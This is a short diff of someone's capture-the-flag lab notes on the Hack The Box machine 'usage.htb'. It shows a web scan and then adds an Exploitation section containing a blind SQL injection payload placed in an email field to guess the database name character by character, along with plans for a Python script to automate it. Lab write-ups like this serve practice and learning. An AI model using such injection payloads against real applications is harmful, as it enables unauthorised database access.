@@ -37,4 +37,12 @@ whatweb http://usage.htb/
 >![[Pasted image 20250320121012.png]]
 
 # Exploitation
-- maybe we can try to get a valid email using a script, 
+- maybe we can try to get a valid email using a script, lets check some SQLi
+```
+test@test.com' and substring(database(),1,1) = 'U' -- -
+```
+>[!example]- Result
+>![[Pasted image 20250320141831.png]]
+>![[Pasted image 20250320141756.png]]
+
+- nice lets make a python  script to automate this process
